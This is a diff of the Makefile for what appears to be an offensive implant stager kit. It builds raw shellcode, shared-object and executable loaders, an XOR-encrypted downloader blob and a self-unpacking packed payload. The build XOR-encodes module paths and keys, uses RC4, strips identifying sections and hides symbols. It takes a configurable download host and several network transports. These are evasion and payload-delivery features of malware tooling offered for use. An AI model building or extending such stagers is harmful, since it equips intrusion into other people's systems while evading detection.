@@ -1,13 +1,17 @@
-# The stager is freestanding C compiled into raw shellcode. Default to the zig
-# toolchain shipped in the operator kit (see core/build.py install_zig) so the
-# build never depends on a host C compiler and is byte-stable everywhere.
-# Override on the command line (e.g. `make CC=gcc ...`) for a custom toolchain.
+# The stager ships as freestanding raw shellcode and as hosted SO/EXE formats.
+# All C is built with the pinned zig toolchain shipped in the operator kit (see
+# core/build.py install_zig) so the build never depends on a host compiler and
+# is byte-stable everywhere. Override on the command line (e.g. `make CC=gcc`)
+# for a custom toolchain.
 #
-# No glibc target is pinned here on purpose: the stager links with -nostdlib, so
-# no libc is ever pulled in and the glibc version cannot affect the artifact.
-# zig also drops the target's libc include paths when -nostdlib is on the
-# compile+link command, so an explicit versioned target would break the
-# <stdlib.h>/<string.h> includes that rc4.c still needs declarations from.
+# PIC stages (raw shellcode, downloader blob, unpack stub) link with -nostdlib
+# and pin no target: no libc, no dynamic linker, no versioned ABI.
+#
+# Hosted SO/EXE formats link glibc dynamically so the dynamic linker maps libc
+# and dynload.c can resolve dlopen/dlsym/dlclose. They target the oldest glibc
+# that provides the symbols selected by DYNLOAD_MODE: 2.34 for the public
+# dlopen (merged into libc in 2.34) and 2.17 for glibc-internal
+# __libc_dlopen_mode. Never statically link glibc.
 CC = zig cc
 
 # -fno-toplevel-reorder is a GCC-only flag that clang/zig cc reject, so only
@@ -19,7 +23,10 @@ else
 TOPLEVEL_REORDER_FLAG = -fno-toplevel-reorder
 endif
 
-COMMON_CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -nostdlib -I. -I../common \
+# Flags common to every stager translation unit. The freestanding PIC stages add
+# -nostdlib (PIC_CFLAGS); the hosted SO/EXE formats add a versioned glibc target
+# instead (HOSTED_CFLAGS) so the runtime maps libc.
+COMMON_CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -I. -I../common \
 								$(TOPLEVEL_REORDER_FLAG) -s -fno-ident -ffunction-sections -fdata-sections \
 								-fno-asynchronous-unwind-tables -fvisibility=hidden
 
@@ -57,20 +64,25 @@ LDFLAGS_MAGIC =
 PIC_LAYOUT = -Wl,-T,stager_pic.ld
 STAGE0_BASE = -Wl,--image-base=0x10000000
 STAGE1_BASE = -Wl,--image-base=0x0
-# lld turns `-static -shared` into an ar archive, and ignores a fixed base for
-# a PIC shared object, so neither is passed for zig.
-SO_STATIC =
-SO_BASE =
+# Hosted SO/EXE link glibc natively at the target ABI; no fixed base or static
+# runtime. GLIBC_VERSION is chosen by DYNLOAD_MODE below.
+HOSTED_TARGET = -target x86_64-linux-gnu.$(GLIBC_VERSION)
 else
 LDFLAGS_MAGIC = -Wl,-n
 PIC_LAYOUT =
 STAGE0_BASE = -Wl,-Ttext-segment=0x10000000
 STAGE1_BASE = -Wl,-Ttext-segment=0x0
-SO_STATIC = -static
-SO_BASE = -Wl,-Ttext-segment=0x10000000
+# A custom toolchain links against its own system glibc; nothing to pin.
+HOSTED_TARGET =
 endif
 
+# Shared linker flags for the freestanding PIC stages. `-static` here only means
+# "no dynamic linker"; -nostdlib on PIC_CFLAGS keeps the runtime out.
 LDFLAGS_COMMON = -static -Wl,--gc-sections $(LDFLAGS_MAGIC) -Wl,--build-id=none
+
+# Hosted SO/EXE keep the default page-aligned multi-segment layout (distinct
+# RX/RW LOADs) and link glibc.
+HOSTED_LDFLAGS = -Wl,--gc-sections -Wl,--build-id=none
 
 # Specific linker flags
 STAGE0_LDFLAGS = $(LDFLAGS_COMMON) $(PIC_LAYOUT) $(STAGE0_BASE)
@@ -78,11 +90,6 @@ STAGE1_LDFLAGS = $(LDFLAGS_COMMON) $(PIC_LAYOUT) $(STAGE1_BASE)
 # The downloader is a position-independent blob mapped at an arbitrary address
 # by the stub, so it links as its own stage at virtual address 0.
 DL_LDFLAGS = $(STAGE1_LDFLAGS)
-# A shared object carries a writable .dynamic section, so --nmagic's single
-# packed segment would fold RW data into the RX text segment and yield RWX.
-# Use the default page-aligned multi-segment layout (distinct RX/RW LOADs)
-# instead; sections no longer need to be contiguous for a real shared object.
-SO_LDFLAGS = $(SO_STATIC) -Wl,--gc-sections -Wl,--build-id=none $(SO_BASE)
 
 # Default configuration (can be overridden by environment variables)
 DOWNLOAD_HOST ?= 127.0.0.1
@@ -114,8 +121,13 @@ TRANSPORT_SRC = transport_$(TRANSPORT).c
 DYNLOAD_MODE ?= public
 ifeq ($(DYNLOAD_MODE), libc_dl)
   DYNLOAD_MODE_CFLAG = -DDYNLOAD_MODE=1
+  # __libc_dlopen_mode/__libc_dlsym/__libc_dlclose have been in libc since
+  # glibc 2.2; 2.17 is the oldest ABI the project supports.
+  GLIBC_VERSION = 2.17
 else
   DYNLOAD_MODE_CFLAG = -DDYNLOAD_MODE=0
+  # Public dlopen/dlsym/dlclose moved from libdl.so.2 into libc.so.6 in 2.34.
+  GLIBC_VERSION = 2.34
 endif
 
 # Dynamic symbol hash table preference (see dynload.c)
@@ -156,6 +168,11 @@ COMMON_CFLAGS += -DENCODED_MODULE_PATH="$(XOR_MODULE_PATH)"
 COMMON_CFLAGS += -DENCODED_LIB_PATH="$(XOR_LIB_PATH)"
 COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
 
+# Freestanding PIC stages never link a runtime or pin an ABI. Hosted SO/EXE
+# stages link glibc at the ABI selected by DYNLOAD_MODE.
+PIC_CFLAGS = $(COMMON_CFLAGS) -nostdlib
+HOSTED_CFLAGS = $(COMMON_CFLAGS) $(HOSTED_TARGET)
+
 # Granular source selection: compile only what the selected transport needs.
 #   http/tcp/udp/libssl -> raw syscall sockets (net_utils.c)
 #   libcurl/libssl      -> runtime dynamic loader (dynload.c)
@@ -190,6 +207,7 @@ STUB_SRCS = stub.c utils_min.c ../common/rc4.c debug.c syscalls.c
 
 STAGE0_TARGET = stager
 SHELLCODE = stager.bin
+RAW_ELF = stager-raw.elf
 SHARED_LIB = stager.so
 
 # Self-unpacking (pluggable, mirrors the transport interface). Each unpacker
@@ -214,18 +232,28 @@ all: raw
 # 1. Raw shellcode (.bin)
 raw: $(SHELLCODE)
 
-$(SHELLCODE): $(STAGE0_TARGET)
-	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(STAGE0_TARGET)
-	objcopy -O binary -j .init -j .text -j .rodata -j .data $(STAGE0_TARGET) $@
+# Freestanding stage0 ELF used only as the objcopy source for the raw shellcode:
+# it keeps the custom _start at offset 0 and the tight PIC layout, and links no
+# runtime. The hosted executable is a separate artifact (see $(STAGE0_TARGET)).
+$(RAW_ELF): $(STUB_SRCS) $(DL_BLOB_H)
+	$(CC) $(PIC_CFLAGS) $(STAGE0_LDFLAGS) -o $@ $(STUB_SRCS)
+
+$(SHELLCODE): $(RAW_ELF)
+	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(RAW_ELF)
+	objcopy -O binary -j .init -j .text -j .rodata -j .data $(RAW_ELF) $@
 	@echo "Shellcode generated at $(PWD)/$@"
 	@wc -c $@
 
 # 2. ELF Executable (stager)
+# Hosted ELF: links glibc so the dynamic loader maps libc and dynload.c can
+# resolve dl*. It uses the C runtime startup (glibc _start -> main), so the
+# custom _start is compiled out and the default segment layout is used instead
+# of stager_pic.ld.
 executable: $(STAGE0_TARGET)
 
 # Downloader blob: flat PIC binary + XOR-encrypted embedding header.
 $(DL_TARGET): $(DL_SRCS)
-	$(CC) $(COMMON_CFLAGS) $(DL_LDFLAGS) -o $@ $(DL_SRCS)
+	$(CC) $(PIC_CFLAGS) $(DL_LDFLAGS) -o $@ $(DL_SRCS)
 
 $(DL_BIN): $(DL_TARGET)
 	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(DL_TARGET)
@@ -244,7 +272,7 @@ $(DL_BLOB_H): $(DL_BIN)
 	print('#endif')" > $@
 
 $(STAGE0_TARGET): $(STUB_SRCS) $(DL_BLOB_H)
-	$(CC) $(COMMON_CFLAGS) $(STAGE0_LDFLAGS) -o $@ $(STUB_SRCS)
+	$(CC) $(HOSTED_CFLAGS) -DSTAGER_LINKED_LIBC $(HOSTED_LDFLAGS) -o $@ $(STUB_SRCS)
 	@echo "[+] Exported symbols in $(STAGE0_TARGET):"
 	@nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true
 
@@ -252,7 +280,7 @@ $(STAGE0_TARGET): $(STUB_SRCS) $(DL_BLOB_H)
 so: $(SHARED_LIB)
 
 $(SHARED_LIB): $(STUB_SRCS) $(DL_BLOB_H)
-	$(CC) $(COMMON_CFLAGS) -shared $(SO_LDFLAGS) -o $@ $(STUB_SRCS)
+	$(CC) $(HOSTED_CFLAGS) -DSTAGER_LINKED_LIBC -shared $(HOSTED_LDFLAGS) -o $@ $(STUB_SRCS)
 	@echo "Shared library generated at $(PWD)/$@"
 	@echo "[+] Exported symbols in $(SHARED_LIB):"
 	@nm -D $@ 2>/dev/null | grep ' [T|g] ' || nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true
@@ -261,7 +289,7 @@ $(SHARED_LIB): $(STUB_SRCS) $(DL_BLOB_H)
 packed: $(PACKED)
 
 $(STUB_ELF): $(UNPACK_SRCS) unpack_stub.ld
-	$(CC) $(COMMON_CFLAGS) $(LDFLAGS_COMMON) -Wl,-e,_start -Wl,-T,unpack_stub.ld -o $@ $(UNPACK_SRCS)
+	$(CC) $(PIC_CFLAGS) $(LDFLAGS_COMMON) -Wl,-e,_start -Wl,-T,unpack_stub.ld -o $@ $(UNPACK_SRCS)
 
 # Extract the stub as a single flat binary, preserving the vaddr layout
 # (including alignment padding between sections).  The old approach of
@@ -278,6 +306,6 @@ $(PACKED): $(SHELLCODE) $(STUB_BIN) $(STUB_ELF)
 	@echo "packed:   $$(wc -c < $(PACKED)) bytes"
 
 clean:
-	rm -f $(STAGE0_TARGET) $(SHELLCODE) $(SHARED_LIB) \
+	rm -f $(STAGE0_TARGET) $(SHELLCODE) $(RAW_ELF) $(SHARED_LIB) \
 		$(STUB_ELF) $(STUB_BIN) $(PACKED) \
 		downloader downloader.bin downloader_blob.h *.o
